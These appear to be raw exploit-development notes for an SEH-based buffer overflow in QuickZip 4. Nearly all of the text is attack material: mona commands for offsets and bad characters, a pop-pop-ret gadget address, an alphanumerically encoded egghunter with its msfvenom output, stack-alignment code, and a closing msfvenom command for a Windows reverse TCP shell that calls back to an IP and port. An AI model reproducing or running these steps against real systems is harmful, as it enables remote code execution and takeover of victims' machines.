!mona pc 4064
!mona po <4 byte address>

seh:  6A41376A -292
nseh: 396A4138 - 296

!mona seh
!mona bytearray

0f - A4

find bad chars::
!mona compare -f bytearray.bin -a <start address of byarray provided>
--------------------------------------------
mona Memory comparison results, item 0 Address=0x01648cf4 Status=Corruption after 0 bytes BadChars=00 0a 0d 0f 14 15 2f 3b
 Type=normal
 Location=??
--------------------------------------------
00 0a 0d 0f 14 15 2f 3a 5c
80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f
90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f
a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af
b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf
c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf
d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df
e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef
f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff
-----------------------------------------------'



80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f| File
   |c7 fc e9 e2 e4 e0 e5 e7 ea eb e8 ef ee ec c4 c5| Memory

90 |90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f| File
   |c9 e6 c6 f4 f6 f2 fb f9 ff d6 dc a2 a3 a5 50 83| Memory

a0 |a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af| File
   |e1 ed f3 fa f1 d1 aa ba bf ac ac bd bc a1 ab bb| Memory

b0 |b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf| File
   |a6 a6 a6 a6 a6 a6 a6 2b 2b a6 a6 2b 2b 2b 2b 2b| Memory

c0 |c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf| File
   |2b 2d 2d 2b 2d 2b a6 a6 2b 2b 2d 2d a6 2d 2b 2d| Memory

d0 |d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df| File
   |2d 2d 2d 2b 2b 2b 2b 2b 2b 2b 2b a6 5f a6 a6 af| Memory

e0 |e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef| File
   |61 df 47 70 53 73 b5 74 46 54 4f 64 38 66 65 6e| Memory

f0 |f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff| File
   |3d b1 3d 3d 28 29 f7 98 b0 b7 b7 76 6e b2 a6 a0| Memory
    `-----------------------------------------------'

0x00407a33 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)



crerate egghunter.bin:
cat egghunter.txt | tr -d '"' | tr -d '\n' | tr -d '\\x' | xxd -r -p > egghunter.bin

create msfpayload with encoder:
msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed BufferRegister=EDX -a x86 --platform Windows -b '\x5c\x3a\x14\x15\x2f'
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 117 (iteration=0)
x86/alpha_mixed chosen with final size 117

Payload size: 117 bytes
JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIsVMQjj9oVobbQBBJuRRxHMDnwLgurzbThoNXd7FPvPrTNkzZloCEJJnOpu9wkOjGAA

mona command to get encoded value:
!mona encode -t alphanum -s '\x90\xFA\x12\x00'


egghunter start address:
0012FA90   4A               DEC EDX


Results:
--------
  %JMNU : \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
  %521* : \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
  -%WNU : \x2d\x25\x57\x4e\x55 : SUB EAX,0x554e5725
  -%WNU : \x2d\x25\x57\x4e\x55 : SUB EAX,0x554e5725
  -&WPU : \x2d\x26\x57\x50\x55 : SUB EAX,0x55505726
  P : \x50 : PUSH EAX

Full encoded string:
--------------------
%JMNU%521*-%WNU-%WNU-&WPUP

Full encoded hex:
-----------------
\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x25\x57\x4e\x55\x2d\x25\x57\x4e\x55\x2d\x26\x57\x50\x55\x50

Hex value: 
0012fbb3 – 0012FA90 = 123

#stack alignment code

add eax, 0x11221246
sub eax, 0x11221123
push eax
pop esp


msfvenom -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=192.168.0.121 LPORT=443 -a x86 --platform Windows -b '\x5c\x3a\x14\x15\x2f'
